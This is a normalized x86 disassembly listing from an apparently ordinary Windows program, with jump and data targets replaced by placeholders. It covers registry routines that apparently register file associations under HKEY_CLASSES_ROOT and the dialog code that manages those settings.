jne r-xdata
mov [ esp + 0xc ] 0x0
jmp r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0xc ]
push edx
call ebp
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
push 0x0
push 0x0
push 0x0
push eax
mov [ esp + 0x24 ] eax
call [ RegQueryValueExA@IAT ]
mov edi eax
mov eax [ esp + 0xc ]
push eax
call ebp
xor eax eax
test edi edi
mov [ esp + 0xc ] eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x20c
retn
lea ecx [ esp + 0xc ]
push ecx
push 0xf003f
push edi
lea edx [ esp + 0x24 ]
push edx
push 0x80000000
call esi
test eax eax
je r-xdata
sub_444ad0
mov eax [ esp + 0x4 ]
sub esp 0x8
push ebx
mov ebx [ esp + 0x14 ]
push edi
push eax
mov [ ebx ] 0x0
call sub_4448f0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
mov esi [ RegOpenKeyExA@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push 0xf003f
push 0x0
push r--data
push edi
call esi
test eax eax
je r-xdata
pop edi
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x1c ]
lea edx [ esp + 0xc ]
push edx
push 0xf003f
push 0x0
push r--data
push eax
call esi
test eax eax
je r-xdata
push edi
call [ RegCloseKey@IAT ]
pop esi
pop edi
xor eax eax
pop ebx
add esp 0x8
retn
mov eax [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push edx
push 0xf003f
push 0x0
push r--data
push eax
call esi
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
push edi
call esi
pop esi
pop edi
xor eax eax
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x20 ]
push eax
push ebx
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryValueExA@IAT ]
mov edx [ esp + 0x10 ]
mov esi [ RegCloseKey@IAT ]
push edx
mov ebx eax
call esi
mov eax [ esp + 0xc ]
push eax
call esi
mov ecx [ esp + 0x1c ]
push ecx
call esi
push edi
call esi
pop esi
xor eax eax
test ebx ebx
pop edi
sete al
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0xc ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x1c ]
push edx
call esi
push edi
call esi
pop esi
pop edi
xor eax eax
pop ebx
add esp 0x8
retn
sub_444be0
sub esp 0x14
push esi
push edi
mov edi [ esp + 0x20 ]
push edi
call sub_4448f0
mov esi [ RegCreateKeyExA@IAT ]
add esp 0x4
test eax eax
mov [ esp + 0x8 ] eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x10 ]
push edx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push r--data
push eax
call esi
test eax eax
je r-xdata
mov edx [ edi * 4 + rw-data ]
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push edx
push 0x80000000
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push r--data
push eax
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x14
retn
pop edi
xor eax eax
pop esi
add esp 0x14
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push r--data
push edx
call esi
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x8 ]
push edx
call esi
pop edi
xor eax eax
pop esi
add esp 0x14
retn
mov esi [ esp + 0x24 ]
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
mov eax [ esp + 0x1c ]
push esi
push 0x1
push 0x0
push 0x0
push eax
call [ RegSetValueExA@IAT ]
mov ecx [ esp + 0x18 ]
mov esi [ RegCloseKey@IAT ]
push ecx
mov edi eax
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
mov eax [ esp + 0xc ]
push eax
call esi
mov ecx [ esp + 0x8 ]
push ecx
call esi
xor eax eax
test edi edi
pop edi
sete al
pop esi
add esp 0x14
retn
mov eax [ esp + 0x14 ]
mov esi [ RegCloseKey@IAT ]
push eax
call esi
mov ecx [ esp + 0xc ]
push ecx
call esi
mov edx [ esp + 0x8 ]
push edx
call esi
sub_444d50
push ecx
mov eax [ esp + 0x8 ]
push esi
push eax
call sub_4448f0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor eax eax
pop esi
pop ecx
retn
lea ecx [ esp + 0x4 ]
push ecx
push 0xf003f
push 0x0
push r--data
push esi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x4 ]
push ebx
push edi
push r--data
push edx
call [ SHDeleteKeyA@IAT ]
mov ebx [ RegCloseKey@IAT ]
mov edi eax
mov eax [ esp + 0xc ]
push eax
call ebx
push esi
call ebx
xor eax eax
test edi edi
pop edi
pop ebx
sete al
pop esi
pop ecx
retn
push esi
call [ RegCloseKey@IAT ]
sub_444dc0
mov eax [ esp + 0x8 ]
sub esp 0xba8
cmp eax 0x110
push ebx
push ebp
push esi
push edi
ja r-xdata
cmp eax 0x111
jne r-xdata
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xba8
retn 0x10
movzx eax [ esp + 0xbc4 ]
cmp eax 0x4ed
jg r-xdata
push 0xcf0
call j_sub_4b573e#2
mov ecx [ esp + 0xbc0 ]
add esp 0x4
push 0xdb5
push ecx
mov [ rw-data ] eax
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
xor esi esi
push esi
push esi
mov ebx eax
push 0x1037
push ebx
call ebp
or eax 0x25
push eax
push esi
push 0x1036
push ebx
call ebp
lea edx [ esp + 0x64 ]
push edx
push 0x1
push 0x101b
push ebx
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x78 ] esi
mov [ esp + 0x7c ] 0x132
mov [ esp + 0x80 ] r--data
mov [ esp + 0x88 ] esi
call ebp
xor edi edi
sub eax 0x2
je r-xdata
cmp eax 0x4ee
jne r-xdata
je r-xdata
inc edi
add esi 0x114
cmp edi 0xc
jb r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x18 ]
push edx
push edi
push 0x102b
push ebx
mov [ esi + ecx + 0x110 ] 0x1
mov [ esp + 0x38 ] 0xf000
mov [ esp + 0x34 ] 0x2000
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0x7b8 ]
push 0x400
lea edx [ esp + 0xb0 ]
mov [ esp + 0x14 ] eax
push edx
lea eax [ esp + 0x18 ]
push eax
lea ebp [ esi + ecx ]
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
mov eax [ rw-data ]
push eax
call j_sub_4b66ed
add esp 0x4
sub eax 0x4c
jne r-xdata
push 0x104
lea eax [ esp + 0x4b0 ]
push eax
push 0x0
mov [ esp + 0x5bc ] 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x4ac ]
push ecx
call sub_457f40
mov esi [ esp + 0xbc0 ]
add esp 0x4
lea edx [ esp + 0x4ac ]
dec edx
mov [ eax + edx ] 0x0
xor eax eax
push 0xfffffffa
mov ecx 0x13
lea edi [ esp + 0x1c ]
[ edi ]
push esi
mov [ esp + 0x20 ] 0x4c
mov [ esp + 0x24 ] esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x5b0 ]
mov [ esp + 0x34 ] eax
mov eax 0x103
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x4ac ]
push edx
mov [ esp + 0x28 ] r--data
mov [ esp + 0x34 ] 0x1
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] ecx
mov [ esp + 0x4c ] r--data
mov [ esp + 0x50 ] 0x1000
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xbbc ]
push 0xdb5
push eax
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
mov edi eax
xor esi esi
mov ebp 0x1000
nop
dec eax
je r-xdata
mov eax [ rw-data ]
mov [ esi + eax ] 0x0
or ecx 0xffffffff
mov [ esi + eax + 0x108 ] ecx
mov [ esi + eax + 0x10c ] ecx
lea ecx [ esp + 0x84 ]
push ecx
mov [ esi + eax + 0x1 ] 0x0
mov eax [ edi * 4 + rw-data ]
push 0x0
push 0x1007
push ebx
mov [ esp + 0x98 ] edi
mov [ esp + 0x94 ] 0x1
mov [ esp + 0xa8 ] eax
mov [ esp + 0x9c ] 0x0
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
push 0x400
lea eax [ esp + 0x7bc ]
push eax
push edi
mov [ esi + edx + 0x110 ] 0x0
call sub_444ad0
add esp 0xc
test eax eax
je r-xdata
call sub_444520
test eax eax
mov edi [ esp + 0xbbc ]
je r-xdata
push 0x400
lea ecx [ esp + 0xb0 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
cmp [ esp + 0xbc4 ] 0xdb5
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
mov al [ esp + 0x5b0 ]
test al al
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push esi
push 0x102b
push edi
mov [ esp + 0x38 ] 0xf000
mov [ esp + 0x34 ] ebp
call ebx
inc esi
cmp esi 0xc
jb r-xdata
mov edx [ esp + 0xbbc ]
push 0x0
push 0xdb4
push edx
call [ CheckDlgButton@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
mov ebp [ esp + 0xbbc ]
push 0xdb5
push ebp
call [ GetDlgItem@IAT ]
mov ebx [ wsprintfA@IAT ]
mov edi [ lstrcatA@IAT ]
xor esi esi
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] esi
mov edi edi
dec eax
jne r-xdata
mov ebx [ GetDlgItem@IAT ]
push 0x0
push 0x4f3
push edi
call ebx
mov esi [ EnableWindow@IAT ]
push eax
call esi
push 0x0
push 0xdb6
push edi
call ebx
push eax
call esi
push 0x0
push 0x410
push edi
call ebx
push eax
call esi
push 0x0
push 0x4ee
push edi
call ebx
push eax
call esi
push 0x0
push 0xdb8
push edi
call ebx
push eax
call esi
push 0x0
push 0xdb9
push edi
call ebx
push eax
call esi
push 0x0
push 0xdba
push edi
call ebx
push eax
call esi
push 0x0
push 0xdbb
push edi
call ebx
push eax
call esi
push 0x0
push 0xdb7
push edi
call ebx
push eax
call esi
push 0x0
push 0xdbd
push edi
call ebx
push eax
call esi
push 0x0
push 0xdbe
push edi
call ebx
push eax
call esi
push 0x0
push 0xdbf
push edi
call ebx
push eax
call esi
push 0x0
push 0xdc0
push edi
call ebx
push eax
call esi
push 0x0
push 0xdc1
push edi
call ebx
push eax
call esi
push 0x0
push 0xdc2
push edi
call ebx
push eax
call esi
push 0x0
push 0xdbc
push edi
call ebx
push eax
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
push 0x1
push 0xdb4
push edi
call [ CheckDlgButton@IAT ]
push 0x400
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
mov edi [ esp + 0xbc8 ]
cmp [ edi + 0x8 ] 0xffffff9b
jne r-xdata
lea eax [ esp + 0x5b0 ]
push eax
push 0x0
push 0xc
push 0x410
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ rw-data ]
cmp [ esi + ecx + 0x110 ] 0x1
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push 0x2
push edx
push 0x102c
push eax
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0xbbc ]
push 0x2
push edx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
lea ebx [ ebx ]
mov ebx [ edi + 0xc ]
mov esi [ esp + 0xbbc ]
mov ebp [ GetDlgItem@IAT ]
push 0x2
push ebx
push 0x102c
push 0xdb5
push esi
call ebp
push eax
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
inc edx
add esi 0x114
cmp esi 0xcf0
mov [ esp + 0x10 ] edx
jb r-xdata
mov edx [ esp + 0x10 ]
push edx
call sub_444d50
add esp 0x4
push 0x104
lea eax [ esp + 0x6b8 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x6b4 ]
push ecx
lea edx [ esp + 0xb0 ]
push r--data
push edx
call ebx
mov eax [ rw-data ]
mov cl [ esi + eax ]
add esp 0xc
test cl cl
je r-xdata
mov edi [ IsDlgButtonChecked@IAT ]
push 0x4f3
push ebp
call edi
cmp eax 0x1
jne r-xdata
push 0x400
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
call sub_4581e0
add esp 0xc
test eax eax
jge r-xdata
mov al [ esp + 0xad ]
cmp al 0x66
je r-xdata
mov eax [ edi + 0x14 ]
test ah 0x30
jne r-xdata
mov eax [ rw-data ]
mov edi ebx
imul edi edi 0x114
movzx ecx [ edi + eax ]
push ecx
push 0x4f3
push esi
call [ CheckDlgButton@IAT ]
mov edx [ rw-data ]
lea eax [ edi + edx + 0x1 ]
push eax
push 0x0
push 0xc
push 0x410
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ rw-data ]
mov ecx [ edi + ecx + 0x108 ]
xor eax eax
cmp ecx 0xffffffff
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push 0xf000
push eax
push 0x102c
push ecx
call [ SendMessageA@IAT ]
shr eax 0xc
dec eax
je r-xdata
push 0xdb4
push ebp
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
mov cl [ esi + eax + 0x1 ]
test cl cl
je r-xdata
push r--data
lea eax [ esp + 0xb0 ]
push eax
call edi
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ esi + edx ]
mov [ eax ] 0x0
mov ecx [ rw-data ]
lea eax [ esi + ecx ]
mov [ eax ] 0x1
jmp r-xdata
cmp [ esp + 0xac ] 0x2d
jne r-xdata
mov [ ebp ] 0x1
cmp al 0x46
je r-xdata
mov ebp [ IsDlgButtonChecked@IAT ]
push 0x4f3
push esi
call ebp
imul ebx ebx 0x114
cmp eax 0x1
jne r-xdata
add eax 0xdb8
push eax
push 0xdbb
push 0xdb8
push esi
call [ CheckRadioButton@IAT ]
mov edx [ rw-data ]
mov eax [ edi + edx + 0x10c ]
add eax 0xdbe
push eax
push 0xdc2
push 0xdbd
push esi
call [ CheckRadioButton@IAT ]
push 0xf000
push ebx
push 0x102c
push 0xdb5
push esi
xor edi edi
call ebp
push eax
call [ SendMessageA@IAT ]
shr eax 0xc
dec eax
je r-xdata
test ecx ecx
jne r-xdata
call sub_4448a0
push 0x1
push ebp
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
call sub_4445a0
push 0x1
push ebp
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
mov ecx [ esi + eax + 0x108 ]
cmp ecx 0xffffffff
je r-xdata
push r--data
lea ecx [ esp + 0xb0 ]
push ecx
call edi
mov edx [ rw-data ]
lea eax [ esi + edx + 0x1 ]
push eax
lea ecx [ esp + 0xb0 ]
push ecx
call edi
push r--data
lea edx [ esp + 0xb0 ]
push edx
call edi
mov eax [ rw-data ]
push 0xdb9
push ebp
call edi
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
mov [ esi + eax + 0x108 ] 0xffffffff
jmp r-xdata
inc eax
push eax
push 0x104
push 0xd
push 0x410
push ebp
call [ SendDlgItemMessageA@IAT ]
push 0xdb8
push ebp
call edi
cmp eax 0x1
jne r-xdata
cmp al 0x69
je r-xdata
mov edx [ rw-data ]
lea eax [ ebx + edx ]
mov [ eax ] 0x0
mov ecx [ rw-data ]
lea eax [ ebx + ecx ]
mov [ eax ] 0x1
jmp r-xdata
push edi
push 0x4f3
push esi
call ebp
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push edi
push 0xdb6
push esi
call ebp
push eax
call ebx
push edi
push 0x410
push esi
call ebp
push eax
call ebx
push edi
push 0x4ee
push esi
call ebp
push eax
call ebx
push edi
push 0xdb8
push esi
call ebp
push eax
call ebx
push edi
push 0xdb9
push esi
call ebp
push eax
call ebx
push edi
push 0xdba
push esi
call ebp
push eax
call ebx
push edi
push 0xdbb
push esi
call ebp
push eax
call ebx
push edi
push 0xdb7
push esi
call ebp
push eax
call ebx
push edi
push 0xdbd
push esi
call ebp
push eax
call ebx
push edi
push 0xdbe
push esi
call ebp
push eax
call ebx
push edi
push 0xdbf
push esi
call ebp
push eax
call ebx
push edi
push 0xdc0
push esi
call ebp
push eax
call ebx
push edi
push 0xdc1
push esi
call ebp
push eax
call ebx
push edi
push 0xdc2
push esi
call ebp
push eax
call ebx
push edi
push 0xdbc
push esi
call ebp
push eax
call ebx
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
mov edi 0x1
cmp ecx 0x1
jne r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ esi + eax + 0x10c ]
cmp ecx 0xffffffff
je r-xdata
mov eax ecx
push eax
lea ecx [ esp + 0x5b4 ]
push r--data
push ecx
call ebx
add esp 0xc
lea edx [ esp + 0x5b0 ]
push edx
lea eax [ esp + 0xb0 ]
push eax
call edi
mov eax [ rw-data ]
push 0xdba
push ebp
call edi
cmp eax 0x1
jne r-xdata
mov ecx [ rw-data ]
mov [ esi + ecx + 0x108 ] eax
jmp r-xdata
or edi 0xffffffff
mov ebx 0x6
push 0x400
lea edx [ esp + 0xb0 ]
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
cmp al 0x49
je r-xdata
push 0xdb9
push esi
call ebp
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
mov [ ebx + eax + 0x108 ] 0xffffffff
jmp r-xdata
inc eax
push eax
push 0x104
push 0xd
push 0x410
push esi
call [ SendDlgItemMessageA@IAT ]
push 0xdb8
push esi
call ebp
cmp eax 0x1
jne r-xdata
cmp ecx 0x2
jne r-xdata
mov eax ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0xac ]
push edx
push eax
call sub_444be0
add esp 0x8
jmp r-xdata
push ecx
lea edx [ esp + 0x4b0 ]
push r--data
push edx
call ebx
add esp 0xc
lea eax [ esp + 0x4ac ]
push eax
lea ecx [ esp + 0xb0 ]
push ecx
call edi
push 0xdbb
push ebp
call edi
cmp eax 0x1
jne r-xdata
mov edx [ rw-data ]
mov [ esi + edx + 0x108 ] 0x2
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx [ rw-data ]
mov [ esi + edx + 0x10c ] edi
lea ecx [ esp + 0xac ]
push ecx
call [ lstrlenA@IAT ]
cmp eax 0x4
jle r-xdata
cmp al 0x70
je r-xdata
push 0xdba
push esi
call ebp
cmp eax 0x1
jne r-xdata
mov ecx [ rw-data ]
mov [ ebx + ecx + 0x108 ] eax
jmp r-xdata
or edi 0xffffffff
mov [ esp + 0x10 ] 0x6
jmp r-xdata
mov eax ecx
mov eax [ rw-data ]
mov [ esi + eax + 0x108 ] 0x0
lea ecx [ edi + 0xdbe ]
push ecx
push ebp
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
mov edi [ lstrcatA@IAT ]
mov ebx [ wsprintfA@IAT ]
cmp [ esp + eax + 0xa8 ] 0x2e
jne r-xdata
push 0x400
lea edx [ esp + 0xb0 ]
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
cmp al 0x50
je r-xdata
push 0xdbb
push esi
call ebp
cmp eax 0x1
jne r-xdata
mov edx [ rw-data ]
mov [ ebx + edx + 0x108 ] 0x2
jmp r-xdata
lea ecx [ edi + 0xdbe ]
push ecx
push esi
call ebp
cmp eax 0x1
jne r-xdata
mov cl [ esp + eax + 0xa9 ]
cmp cl 0x69
je r-xdata
lea ecx [ esp + 0xac ]
push ecx
call j_sub_4b692d
add esp 0x4
mov [ ebp + 0x108 ] eax
jmp r-xdata
cmp al 0x65
je r-xdata
mov eax [ rw-data ]
mov [ ebx + eax + 0x108 ] 0x0
mov eax [ esp + 0x10 ]
inc edi
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov edx [ rw-data ]
mov [ ebx + edx + 0x10c ] edi
mov cl [ esp + eax + 0xaa ]
cmp cl 0x6e
je r-xdata
cmp cl 0x49
jne r-xdata
push 0x400
lea edx [ esp + 0xb0 ]
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
cmp al 0x45
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xba8
retn 0x10
mov al [ esp + eax + 0xab ]
cmp al 0x69
je r-xdata
cmp cl 0x4e
jne r-xdata
lea ecx [ esp + 0xac ]
push ecx
call j_sub_4b692d
add esp 0x4
mov [ ebp + 0x10c ] eax
jmp r-xdata
lea edx [ esp + 0xac ]
push edx
lea eax [ ebp + 0x1 ]
push eax
call [ lstrcpyA@IAT ]
jmp r-xdata
cmp al 0x49
jne r-xdata
sub_445a40
sub esp 0x10
push ebx
mov ebx [ esp + 0x1c ]
cmp ebx 0x100
push esi
push edi
mov edi [ esp + 0x28 ]
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x20 ]
mov edx [ rw-data ]
push eax
push edi
push ebx
push ecx
push edx
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x10
mov eax edi
sub eax 0x26
je r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn 0x10
mov edi [ esp + 0x20 ]
mov esi [ SendMessageA@IAT ]
push 0x0
lea eax [ esp + 0x24 ]
push eax
push 0xb0
push edi
call esi
mov ecx [ esp + 0x20 ]
push 0x0
push ecx
push 0xd6
push edi
call esi
mov edi eax
test edi edi
jge r-xdata
mov eax [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x1004
push eax
call esi
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
sub eax 0x4a
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push 0x0
dec edx
push edx
push 0x1017
push eax
call esi
mov edx [ rw-data ]
lea ecx [ esp + 0xc ]
push ecx
push edx
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0x100e
push eax
mov [ esp + 0x1c ] 0x2
call esi
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push 0x40
sub ecx eax
push ecx
mov ecx [ esp + 0x14 ]
sub edx ecx
push edx
push eax
mov eax [ rw-data ]
push ecx
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov ecx [ rw-data ]
push edi
push 0x0
push 0xd7
push ecx
call esi
mov [ esp + 0x20 ] eax
mov edi 0x3e8
dec eax
cmp ecx eax
jge r-xdata
push 0x10
call [ GetAsyncKeyState@IAT ]
test ah ah
mov esi [ GetParent@IAT ]
jns r-xdata
mov edi [ esp + 0x20 ]
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
push 0xb0
push edi
call esi
mov edx [ esp + 0x24 ]
push 0x0
push edx
push 0xd6
push edi
call esi
mov edi eax
test edi edi
jge r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x4f3
push ecx
mov eax [ rw-data ]
push 0x1
push 0x4f3
push eax
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
inc eax
push eax
push 0x1017
push ecx
call esi
mov ecx [ rw-data ]
lea edx [ esp + 0xc ]
push edx
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push 0x100e
push ecx
mov [ esp + 0x1c ] 0x2
call esi
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0xc ]
push 0x40
sub edx eax
push edx
mov edx [ esp + 0x1c ]
sub edx ecx
push edx
push eax
mov eax [ rw-data ]
push ecx
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov ecx [ rw-data ]
push edi
push 0x0
push 0xd7
push ecx
call esi
mov [ esp + 0x24 ] eax
jmp r-xdata
mov edi 0x3e8
call esi
push eax
call [ CheckDlgButton@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x4ee
push 0x111
push edx
call esi
push eax
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
and eax 0xffff
push eax
push eax
push 0xb1
push edx
call esi
sub_445ca0
sub esp 0x24
push ebx
mov ebx [ esp + 0x30 ]
push ebp
mov ebp [ esp + 0x38 ]
push esi
mov eax ebx
sub eax 0x100
push edi
mov edi [ esp + 0x44 ]
je r-xdata
mov eax ebp
sub eax 0x71
je r-xdata
sub eax 0x11
je r-xdata
mov ecx [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x2
push 0x0
push 0x100c
push ecx
call esi
test eax eax
jl r-xdata
dec eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24
retn 0x10
sub eax 0xf0
jne r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ rw-data ]
push edi
push ebp
push ebx
push ecx
push edx
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn 0x10
mov edx [ rw-data ]
push 0x0
push eax
push 0x1017
push edx
call esi
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] eax
lea eax [ esp + 0x10 ]
push eax
push ecx
push 0x100e
push edx
mov [ esp + 0x20 ] 0x2
call esi
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push 0x40
sub ecx eax
push ecx
mov ecx [ esp + 0x18 ]
sub edx ecx
push edx
push eax
mov eax [ rw-data ]
push ecx
push 0x0
push eax
call [ SetWindowPos@IAT ]
push 0x10
call [ GetAsyncKeyState@IAT ]
test ah ah
mov esi [ GetParent@IAT ]
jns r-xdata
mov esi [ SendMessageA@IAT ]
lea edx [ esp + 0x20 ]
push edx
movzx eax di
push 0x0
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
mov ecx edi
push 0x1039
shr ecx 0x10
push eax
mov [ esp + 0x34 ] ecx
call esi
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push 0x0
push 0x4f3
push edx
mov ecx [ rw-data ]
push 0x1
push 0x4f3
push ecx
jmp r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call [ SetFocus@IAT ]
mov eax [ esp + 0x2c ]
mov ecx [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push eax
push 0x100e
push ecx
mov [ esp + 0x20 ] 0x0
call esi
mov edx [ esp + 0x2c ]
mov eax [ rw-data ]
mov ebx [ esp + 0x10 ]
push 0x0
push edx
push 0x1017
push eax
call esi
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0x100e
push eax
mov [ esp + 0x20 ] 0x2
call esi
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push 0x40
sub ecx eax
push ecx
mov ecx [ esp + 0x18 ]
sub edx ecx
push edx
push eax
mov eax [ rw-data ]
push ecx
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0xb1
push ecx
call esi
mov eax [ rw-data ]
sub edi ebx
sub edi 0x2
movzx edx di
push edx
push 0x0
push 0xd7
push eax
call esi
mov ecx [ rw-data ]
push 0x0
push eax
push 0xd6
push ecx
call esi
push eax
mov eax [ rw-data ]
mov edx ebp
push edx
push 0x201
push eax
call esi
call esi
push eax
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
push 0x0
push 0x4ee
push 0x111
push eax
call esi
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
sub_445f00
mov edx [ esp + 0x4 ]
mov eax [ edx ]
mov cl [ eax ]
test cl cl
je r-xdata
retn
cmp cl 0x20
je r-xdata
inc eax
mov [ edx ] eax
cmp cl 0x9
je r-xdata
movsx ecx cl
cmp ecx 0x81
jne r-xdata
cmp [ eax + 0x1 ] 0x40
jne r-xdata
add eax 0x2
mov [ edx ] eax
retn
sub_445f40
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c041c
push eax
mov eax 0x100a0
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
mov ebp [ esp + 0x100c0 ]
mov eax [ ebp + 0x18 ]
push esi
push edi
mov esi 0x10
push ecx
cmp eax esi
mov edx esp
lea eax [ ebp + 0x4 ]
jb r-xdata
